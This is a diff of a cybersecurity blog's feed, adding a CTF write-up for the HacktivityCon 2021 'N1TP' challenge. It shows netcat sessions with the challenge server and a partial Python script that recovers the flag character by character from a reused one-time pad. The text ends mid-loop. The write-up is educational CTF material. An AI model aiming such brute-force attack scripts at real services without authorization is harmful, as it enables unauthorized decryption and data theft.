@@ -1,4 +1,397 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-08-08T23:19:39-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">DEF CON 29 - Team NINPWN Red Team Village Competition Results</title><link href="http://0.0.0.0:4000/news/2021/08/08/defcon2021results.html" rel="alternate" type="text/html" title="DEF CON 29 - Team NINPWN Red Team Village Competition Results" /><published>2021-08-08T13:12:41-05:00</published><updated>2021-08-08T13:12:41-05:00</updated><id>http://0.0.0.0:4000/news/2021/08/08/defcon2021results</id><content type="html" xml:base="http://0.0.0.0:4000/news/2021/08/08/defcon2021results.html">&lt;table style=&quot;width:75%&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-09-18T17:58:36-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">N1TP</title><link href="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html" rel="alternate" type="text/html" title="N1TP" /><published>2021-09-18T17:25:21-05:00</published><updated>2021-09-18T17:25:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html">&lt;h1&gt;&lt;/h1&gt;
+&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Challenge Text: &lt;/font&gt;&lt;/h3&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;Author: @JohnHammond#&lt;/span&gt;6971
+&lt;span class=&quot;go&quot;&gt;
+Nina found some new encryption scheme that she apparently thinks is really cool. She's annoying but she found a flag or something, can you deal with her?
+
+Connect with:
+
+nc challenge.ctf.games 31921
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Solution: &lt;/font&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Connecting to the service, we are provided with the encrypted flag and allowed to encrypt any string we like.  For this competition, we know that the flag is 32 characters in the format “flag{0-9a-f}”, so we can check out what “flag{“ maps to:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc challenge.ctf.games 31921
+&lt;span class=&quot;go&quot;&gt;NINA: Hello! I found a flag, look!
+      2b372f6747ea6adc33cd0f71ced9f039c3d803dd36c610eddc16007d63b73d1cd2c5876a01d8
+NINA: But I encrypted it with a very special nonce, the same length as 
+      the flag! I heard people say this encryption method is unbreakable!
+      I'll even let you encrypt something to prove it!! What should we encrypt?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+      393e3d7448b62b9f71cb18678d8ae27ed3d946cb73c556ab9b41433074b6770b96c1c52f17c0
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+      2b372f6747b5348a62d50d7f9888ea6ccbdd52c461cc44b894425c2567a8621383c3cd3d0fc4
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;The output does indeed seem to indicate that a one time pad is being used… except it is the same pad being used for every string we enter.  It also appears that each character we enter is mapped to a hexadecimal value.  We can assume these things because we input a five character string and saw that the first 10 characters of the encrypted string we received back were the same as the first 10 characters of the flag we were provided when we connected to the service.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;If we disconnect from the service and re-connect, however, the pad appears to change:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc challenge.ctf.games 31921
+&lt;span class=&quot;go&quot;&gt;NINA: Hello! I found a flag, look!
+      11fdfea632c2fe3807fcbdc68360e71166db3e57509c9880fba21cbb35f24fe5e68728d5cf00
+NINA: But I encrypted it with a very special nonce, the same length as 
+      the flag! I heard people say this encryption method is unbreakable!
+      I'll even let you encrypt something to prove it!! What should we encrypt?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+      03f4ecb53d9ebf7b45faaad0c033f55676da7b41159fdec6bcf55ff622f305f2a2836a90d918
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+      11fdfea6329da06e56e4bfc8d531fd446ede6f4e0796ccd5b3f640e331ed10eab7816282c11c
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Therefore, we’ll have to stay connected and interact with the service until we determine what the flag is.  The Python code below accomplishes this.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# H@cktivityCon 2021 - N1TP Solution
+# shinris3n
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'challenge.ctf.games'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31921&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# The encrypted flag received from &quot;NINA&quot; after connecting to the service.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# The rules state: Flags for this competition will follow the format: flag\{[0-9a-f]{32}\}. That means a `flag{}` wrapper with what looks like an MD5 hash inside the curly braces.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'flag{'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'}'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;possible_flag_characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0123456789abcdef'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Open up connection.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Get greeting.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Retrieve and store the encrypted flag. 
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# The flag appears to be hex formatted, 64 characters plus 12 characters for the flag{} portion, and 6 spaces of padding.
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Encrypted Flag:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Send input to encrypt in flag format.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Data sent:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Get and store encrypted response.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Get flavor text
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Get encrypted response
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Same format as the original flag.
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Encrypted Flag:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Encrypted Response:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Now cycle through the possible flag characters, checking values until everything matches.
+# Starting with character 6 (array index 5), cycle through possible flag characters and move on only after finding a match.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;possible_flag_character&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;possible_flag_characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;possible_flag_character&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;#time.sleep(2) # Two second delay to avoid overloading service.
+&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;# Send input to encrypt in flag format.
+&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Data sent:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Get flavor text
+&lt;/span&gt;                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Get encrypted response
+&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;encrypted_response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Same format as the original flag.
+&lt;/span&gt;                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Encrypted Flag:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Encrypted Response:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        
+                
